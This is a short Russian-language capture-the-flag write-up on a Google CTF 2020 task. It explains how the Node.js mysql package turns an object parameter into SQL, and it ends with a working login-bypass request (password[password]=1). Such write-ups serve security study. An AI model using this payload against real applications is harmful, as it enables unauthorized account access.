# SQLi in Node.js

На Google CTF 2020 был таск.&#x20;

Было: Node.js, mysql-package (16k stars on github) для запросов к базе

Был такой запрос для авторизации:

```javascript
GET /endpoint?user=admin&password=blabla&csrf=
```

Он вставлялся в запрос

```sql
query = "SELECT * FROM users WHERE user == ? AND password == ?"
```

Обычные preparement statement

Однако у библиотеки mysql-package есть особенность по преобразованию JS объектов в параметры запроса

А именно: все объекты преобразуются в массивы и вставляются в итоговый запрос следующим образом:

```
GET /endpoint?user=admin&password[password]=blabla&csrf=

--->

SELECT *
FROM users
WHERE
    user = 'admin'
    AND password='password'='blabla'
    
--->

И этот запрос отработает!!!
password='password' -> он найдет колонку в базе password и скажет, что имена равны
 ==> это True (или 1)
 
Затем будет сравниваться 1 с blabla, 

Далее, авторизация пройдет успешно вот с таким запросом:
GET /endpoint?user=admin&password[password]=1&csrf=
```

